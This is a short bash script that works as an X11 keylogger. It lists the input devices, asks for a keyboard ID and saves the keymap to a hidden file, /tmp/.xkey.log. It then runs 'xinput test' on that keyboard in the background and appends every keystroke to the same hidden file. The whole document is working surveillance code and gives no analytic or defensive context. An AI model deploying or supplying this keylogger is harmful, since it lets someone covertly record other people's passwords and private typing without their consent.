#!/bin/bash
export DISPLAY=:0.0
xinput list
echo -e "KBD ID ?"
read kbd 
xmodmap -pke > /tmp/.xkey.log
script | xinput test $kbd >> /tmp/.xkey.log &
exit  
